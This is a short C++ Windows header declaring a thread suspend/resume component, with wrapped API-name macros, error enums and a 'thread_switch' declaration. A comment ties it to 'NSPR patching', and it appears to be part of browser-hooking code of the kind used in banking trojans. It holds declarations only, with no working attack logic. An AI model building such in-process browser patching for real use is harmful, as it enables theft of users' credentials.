#include <Windows.h>

#include "api.h"
#include "common/mem.h"

#include "debug/error.h"
#include "debug/debug.h"

// Disables subroutine responsible for pausing all threads during NSPR patching
#define DISABLE_THREADING

#pragma once

namespace thread_space
{

#define THREAD_ZEROMEM				mem::zeromem
#define THREAD_GETCURRENTPROCID		cGetCurrentProcessId
#define THREAD_GETCURRENTTHREADID	cGetCurrentThreadId
#define THREAD_GETSNAPSHOT			cCreateToolhelp32Snapshot
#define THREAD_THREAD32FIRST		cThread32First
#define THREAD_OPENTHREAD			cOpenThread
#define THREAD_CLOSEHANDLE			cCloseHandle
#define THREAD_SUSPENDTHREAD		cSuspendThread
#define THREAD_RESUMETHREAD			cResumeThread
#define THREAD_THREAD32NEXT			cThread32Next

#if !defined MAX_THREADS
#define MAX_THREADS					1024
#endif
	
	typedef INT	THREAD_ERROR;

	enum {
		THREAD_ERROR_OK,
		THREAD_ERROR_FAIL
	};

	enum state {
		THREADS_RUNNING,
		THREADS_SUSPENDED
	};

	static const DWORD thread_init_state = 0xfefafcfd;

	// Use this for all remote calls
	THREAD_ERROR thread_switch(VOID);

	// Suspend or resume all threads
	//ERROR_CODE thread_suspend_resume_threads(VOID);

	// Initializes the thread component
	//VOID thread_init(VOID);

	// Internal
	//ERROR_CODE thread_control(BOOL suspend, INT thread_list[MAX_THREADS], PINT thread_count);
};

